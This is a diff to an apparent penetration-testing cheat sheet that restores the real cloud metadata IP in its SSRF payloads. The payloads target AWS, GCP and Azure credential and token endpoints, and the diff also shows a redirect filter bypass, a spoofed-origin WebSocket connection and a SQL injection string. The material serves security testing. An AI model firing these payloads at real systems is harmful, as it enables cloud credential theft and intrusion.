@@ -84,18 +84,18 @@ location.href = SOURCE
 ### Cloud Metadata
 ```bash
 # AWS
-http://[REDACTED_IP]/latest/meta-data/
-http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/
-http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ROLE-NAME
-http://[REDACTED_IP]/latest/user-data/
-http://[REDACTED_IP]/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
 
 # GCP
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 # Header: Metadata-Flavor: Google
 
 # Azure IMDS
-http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
 # Header: Metadata: true
 ```
 
@@ -124,7 +124,7 @@ http://[::ffff:0x7f000001] # mixed hex IPv6
 
 # Redirect chain (Vercel pattern):
 # If filter only checks initial URL but follows redirects:
-http://allowed-domain.com/redirect?to=http://[REDACTED_IP]/
+http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ```
 
 ---
@@ -558,7 +558,7 @@ wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
 {"action": "search", "query": "' OR 1=1--"}
 
 // SSRF (if server fetches URLs from messages)
-{"action": "preview", "url": "http://[REDACTED_IP]/latest/meta-data/"}
+{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
 ```
 
 ---
